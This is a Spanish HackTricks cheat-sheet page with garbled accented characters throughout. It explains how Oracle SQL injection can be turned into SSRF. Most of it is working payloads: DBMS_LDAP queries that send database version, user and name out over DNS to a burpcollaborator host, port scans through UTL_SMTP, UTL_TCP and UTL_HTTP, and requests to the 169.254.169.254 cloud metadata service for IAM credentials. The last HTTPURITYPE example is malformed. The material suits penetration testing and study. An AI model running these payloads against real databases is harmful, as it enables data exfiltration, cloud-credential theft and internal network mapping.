# InyecciÃ³n en Oracle

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## SSRF

El uso de Oracle para realizar solicitudes HTTP y DNS fuera de banda estÃ¡ bien documentado, pero como medio para exfiltrar datos SQL en inyecciones. Siempre podemos modificar estas tÃ©cnicas/funciones para realizar otras SSRF/XSPA.

La instalaciÃ³n de Oracle puede ser realmente dolorosa, especialmente si quieres configurar una instancia rÃ¡pida para probar comandos. Mi amigo y colega de [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), me seÃ±alÃ³ [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c), lo cual me permitiÃ³ configurar una instancia en una mÃ¡quina Ubuntu de AWS t2.large y Docker.

EjecutÃ© el comando de Docker con la opciÃ³n `--network="host"` para poder simular Oracle como una instalaciÃ³n nativa con acceso completo a la red, durante el transcurso de esta publicaciÃ³n de blog.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Paquetes de Oracle que admiten una especificaciÃ³n de URL o de nombre de host/puerto <a href="#paquetes-de-oracle-que-admiten-una-especificaciÃ³n-de-url-o-de-nombre-de-host-puerto" id="paquetes-de-oracle-que-admiten-una-especificaciÃ³n-de-url-o-de-nombre-de-host-puerto"></a>

Para encontrar cualquier paquete y funciÃ³n que admita una especificaciÃ³n de host y puerto, realicÃ© una bÃºsqueda en Google en la [DocumentaciÃ³n en lÃ­nea de Oracle Database](https://docs.oracle.com/database/121/index.html). EspecÃ­ficamente,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
La bÃºsqueda devolviÃ³ los siguientes resultados (no todos se pueden utilizar para realizar conexiones de red salientes):

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Esta bÃºsqueda bÃ¡sica obviamente omite paquetes como `DBMS_LDAP` (que permite pasar un nombre de host y nÃºmero de puerto) ya que [la pÃ¡gina de documentaciÃ³n](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) simplemente te redirige a una [ubicaciÃ³n diferente](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360). Por lo tanto, puede haber otros paquetes de Oracle que se puedan utilizar de manera abusiva para realizar solicitudes salientes que podrÃ­a haber pasado por alto.

En cualquier caso, echemos un vistazo a algunos de los paquetes que hemos descubierto y enumerado anteriormente.

**DBMS\_LDAP.INIT**

El paquete `DBMS_LDAP` permite acceder a datos de servidores LDAP. La funciÃ³n `init()` inicializa una sesiÃ³n con un servidor LDAP y toma un nombre de host y nÃºmero de puerto como argumento.

Esta funciÃ³n ya ha sido documentada anteriormente para mostrar la filtraciÃ³n de datos a travÃ©s de DNS, como se muestra a continuaciÃ³n
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
Sin embargo, dado que la funciÃ³n acepta un nombre de host y un nÃºmero de puerto como argumentos, tambiÃ©n puedes utilizar esto para funcionar como un escÃ¡ner de puertos.

AquÃ­ tienes algunos ejemplos:
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
Un `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` indica que el puerto estÃ¡ cerrado mientras que un valor de sesiÃ³n apunta a que el puerto estÃ¡ abierto.

**UTL\_SMTP**

El paquete `UTL_SMTP` estÃ¡ diseÃ±ado para enviar correos electrÃ³nicos a travÃ©s de SMTP. El ejemplo proporcionado en el [sitio de documentaciÃ³n de Oracle muestra cÃ³mo se puede utilizar este paquete para enviar un correo electrÃ³nico](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478). Sin embargo, para nosotros, lo interesante es la capacidad de proporcionar una especificaciÃ³n de host y puerto.

A continuaciÃ³n se muestra un ejemplo bÃ¡sico con la funciÃ³n `UTL_SMTP.OPEN_CONNECTION`, con un tiempo de espera de 2 segundos.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
Un `ORA-29276: transfer timeout` muestra que el puerto estÃ¡ abierto pero no se estableciÃ³ una conexiÃ³n SMTP, mientras que un `ORA-29278: SMTP transient error: 421 Service not available` indica que el puerto estÃ¡ cerrado.

**UTL\_TCP**

El paquete `UTL_TCP` y sus procedimientos y funciones permiten la comunicaciÃ³n basada en TCP/IP con servicios. Si se programa para un servicio especÃ­fico, este paquete puede convertirse fÃ¡cilmente en una forma de acceder a la red o realizar solicitudes completas del lado del servidor, ya que se puede controlar todos los aspectos de una conexiÃ³n TCP/IP.

El ejemplo en el sitio de documentaciÃ³n de Oracle muestra cÃ³mo se puede utilizar este paquete para realizar una conexiÃ³n TCP cruda y obtener una pÃ¡gina web. Podemos simplificarlo aÃºn mÃ¡s y utilizarlo para hacer solicitudes a la instancia de metadatos, por ejemplo, o a un servicio TCP/IP arbitrario.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
Interesantemente, debido a la capacidad de crear solicitudes TCP sin procesar, este paquete tambiÃ©n se puede utilizar para consultar el servicio de metadatos de instancia de todos los proveedores de servicios en la nube, ya que el tipo de mÃ©todo y los encabezados adicionales se pueden pasar dentro de la solicitud TCP.

**UTL\_HTTP y solicitudes web**

QuizÃ¡s la tÃ©cnica mÃ¡s comÃºn y ampliamente documentada en todos los tutoriales de InyecciÃ³n de SQL Oracle Fuera de Banda es el paquete [`UTL_HTTP`](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070). Este paquete estÃ¡ definido por la documentaciÃ³n como - `El paquete UTL_HTTP realiza llamadas de transferencia de hipertexto (HTTP) desde SQL y PL/SQL. Puede utilizarlo para acceder a datos en Internet a travÃ©s de HTTP.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
TambiÃ©n puedes utilizar esto para realizar un escaneo de puertos rudimentario con consultas como
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
Un `ORA-12541: TNS:no listener` o un `TNS:operation timed out` es una seÃ±al de que el puerto TCP estÃ¡ cerrado, mientras que un `ORA-29263: HTTP protocol error` o datos es una seÃ±al de que el puerto estÃ¡ abierto.

Otro paquete que he utilizado en el pasado con Ã©xito variado es el [mÃ©todo `GETCLOB()` del tipo abstracto Oracle `HTTPURITYPE`](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705) que te permite interactuar con una URL y proporciona soporte para el protocolo HTTP. El mÃ©todo `GETCLOB()` se utiliza para obtener la respuesta GET de una URL como un [tipo de dato CLOB](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
